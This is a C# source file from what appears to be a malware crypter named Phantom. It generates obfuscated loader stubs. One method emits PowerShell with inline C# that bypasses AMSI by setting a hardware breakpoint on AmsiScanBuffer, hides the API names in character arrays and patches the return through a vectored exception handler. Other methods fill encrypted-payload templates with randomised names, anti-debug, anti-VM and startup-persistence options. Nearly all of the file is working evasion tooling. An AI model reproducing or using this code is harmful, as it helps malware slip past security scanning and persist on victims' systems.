using System;
using System.Collections.Generic;
using System.Text;

using static Phantom.Utils;

namespace Phantom
{
    internal class StubGen
    {
        private static string GetHWBPCode(Random rng)
        {
            string hwbpClassName = RandomString(20, rng);
            string initMethod = RandomString(20, rng);
            string delField = RandomString(10, rng);
            string addrField = RandomString(10, rng);

            return $@"
$hwbp = @'
using System;
using System.Reflection;
using System.Runtime.InteropServices;
public class {hwbpClassName}
{{
    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport(""kernel32.dll"")]
    static extern IntPtr AddVectoredExceptionHandler(uint f, IntPtr h);
    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetCurrentThread();
    [DllImport(""kernel32.dll"")]
    static extern bool GetThreadContext(IntPtr t, byte[] c);
    [DllImport(""kernel32.dll"")]
    static extern bool SetThreadContext(IntPtr t, byte[] c);
    delegate long CB(IntPtr p);
    static long _{addrField};
    static CB _{delField};
    static long H(IntPtr p)
    {{
        try {{
            IntPtr r = Marshal.ReadIntPtr(p);
            IntPtr x = Marshal.ReadIntPtr(p, IntPtr.Size);
            if ((uint)Marshal.ReadInt32(r) != 0x80000004) return 0;
            long rip = Marshal.ReadInt64(x, 0xF8);
            if (rip != _{addrField}) return 0;
            Marshal.WriteInt64(x, 0x78, 0);
            long sp = Marshal.ReadInt64(x, 0x98);
            Marshal.WriteInt64(x, 0xF8, Marshal.ReadInt64((IntPtr)sp));
            Marshal.WriteInt64(x, 0x98, sp + 8);
            long rp = Marshal.ReadInt64((IntPtr)(sp + 0x28));
            Marshal.WriteInt64((IntPtr)rp, 0);
            return -1;
        }} catch {{ return 0; }}
    }}
    public static void {initMethod}()
    {{
        string d = new string(new char[] {{ (char)97, (char)109, (char)115, (char)105, (char)46, (char)100, (char)108, (char)108 }});
        string f = new string(new char[] {{ (char)65, (char)109, (char)115, (char)105, (char)83, (char)99, (char)97, (char)110, (char)66, (char)117, (char)102, (char)102, (char)101, (char)114 }});
        IntPtr h = GetModuleHandle(d);
        if (h == IntPtr.Zero) return;
        IntPtr a = GetProcAddress(h, f);
        if (a == IntPtr.Zero) return;
        _{addrField} = a.ToInt64();
        byte[] c = new byte[1232];
        BitConverter.GetBytes((uint)0x0010001B).CopyTo(c, 0x30);
        GetThreadContext(GetCurrentThread(), c);
        BitConverter.GetBytes(_{addrField}).CopyTo(c, 0x48);
        ulong d7 = BitConverter.ToUInt64(c, 0x70) | 1;
        BitConverter.GetBytes(d7).CopyTo(c, 0x70);
        SetThreadContext(GetCurrentThread(), c);
        _{delField} = new CB(H);
        AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_{delField}));
    }}
}}
'@;
Add-Type -TypeDefinition $hwbp;
[{hwbpClassName}]::{initMethod}();
";
        }

        internal static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
        {
            string stubcode = string.Empty;
            string decryptionKey = Convert.ToBase64String(key);
            string decryptionIV = Convert.ToBase64String(iv);
            string batPathVar = RandomString(5, rng);
            string contentsVar = RandomString(5, rng);
            string lastLineVar = RandomString(5, rng);
            string lineVar = RandomString(5, rng);
            string payloadVar = RandomString(5, rng);
            string msiVar = RandomString(5, rng);
            string msoVar = RandomString(5, rng);
            string gsVar = RandomString(5, rng);
            string obfStep1Var = RandomString(5, rng);
            string obfStep2Var = RandomString(5, rng);
            string obfTmpVar = RandomString(5, rng);

            stubcode += GetEmbeddedString(@"Phantom.Resources.AESStub.ps1");

            stubcode = stubcode.Replace(@"DECRYPTION_KEY", decryptionKey)
                               .Replace(@"DECRYPTION_IV", decryptionIV)
                               .Replace(@"batPath_var", batPathVar)
                               .Replace(@"contents_var", contentsVar)
                               .Replace(@"lastline_var", lastLineVar)
                               .Replace(@"line_var", lineVar)
                               .Replace(@"payload_var", payloadVar)
                               .Replace(@"msi_var", msiVar)
                               .Replace(@"mso_var", msoVar)
                               .Replace(@"gs_var", gsVar)
                               .Replace(@"obfstep1_var", obfStep1Var)
                               .Replace(@"obfstep2_var", obfStep2Var)
                               .Replace(@"obftmp_var", obfTmpVar);

            return stubcode;
        }

        // Method to create C# stub code
        internal static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool startup, bool native, Random rng)
        {
            // Declare variables
            string namespacename = RandomString(20, rng);
            string classname = RandomString(20, rng);
            string aesfunction = RandomString(20, rng);
            string uncompressfunction = RandomString(20, rng);
            string gerfunction = RandomString(20, rng);

            // Encrypt predefined strings
            string key_str = Convert.ToBase64String(key);
            string iv_str = Convert.ToBase64String(iv);

            string stub = string.Empty;
            string stubcode = GetEmbeddedString(@"Phantom.Resources.Stub.cs");

            // Add compiler flags if specified
            if (antidebug)
            {
                stub += "#define ANTI_DEBUG\n";
            }
            if (antivm)
            {
                stub += "#define ANTI_VM\n";
            }
            if (startup)
            {
                stub += "#define STARTUP\n";
            }
            if (native)
            {
                stub += "#define NATIVE\n";
            }

            // Replace placeholders with generated values
            stubcode = stubcode.Replace(@"namespace_name", namespacename)
                               .Replace(@"class_name", classname)
                               .Replace(@"aesfunction_name", aesfunction)
                               .Replace(@"uncompressfunction_name", uncompressfunction)
                               .Replace(@"getembeddedresourcefunction_name", gerfunction)
                               .Replace(@"key_str", key_str)
                               .Replace(@"iv_str", iv_str);

            // Concatenate stub code with additional compiler flags if specified
            stub += stubcode;

            // Return the generated C# stub code
            return stub;
        }
    }
}